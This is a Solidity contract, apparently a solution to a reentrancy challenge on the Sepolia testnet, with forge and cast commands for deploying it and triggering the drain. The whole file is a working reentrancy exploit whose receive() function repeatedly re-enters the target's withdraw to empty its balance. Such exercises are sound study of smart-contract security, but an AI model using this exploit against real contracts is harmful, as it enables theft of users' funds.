// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * > forge create src/ReentrancyHack.sol:ReentrancyHack --rpc-url ${SEPOLIA_RPC_URL}
 *          --account updraft --value ${REENTRANCY_INSTANCE_BALANCE} --broadcast
 *          --constructor-args ${REENTRANCY_INSTANCE_ADDRESS} ${REENTRANCY_INSTANCE_BALANCE}
 *
 * > cast send --account updraft --rpc-url ${SEPOLIA_RPC_URL} ${REENTRANCY_HACK_ADDRESS} "drainFunds()"
 *
 * > cast send --account updraft --rpc-url ${SEPOLIA_RPC_URL} ${REENTRANCY_HACK_ADDRESS} "withdraw()"
 *
 */

interface Reentrance {
    function withdraw(uint256 _amount) external;
    function donate(address _to) external payable;
}

contract ReentrancyHack {
    address reentrancyContract;
    address public owner;
    uint256 public instanceBalance;

    constructor(address _reentrancyContract, uint256 _instanceBalance) payable {
        reentrancyContract = _reentrancyContract;
        owner = msg.sender;
        instanceBalance = _instanceBalance;
    }

    function drainFunds() external {
        require(msg.sender == owner, "Only the owner can hack this!");
        Reentrance(reentrancyContract).donate{value: instanceBalance}(address(this));
        Reentrance(reentrancyContract).withdraw(instanceBalance);
    }

    function withdraw() external {
        require(msg.sender == owner, "Only the owner can withdraw the hacked balance!");
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        if (msg.sender == reentrancyContract) {
            Reentrance(reentrancyContract).withdraw(instanceBalance);
        }
    }
}
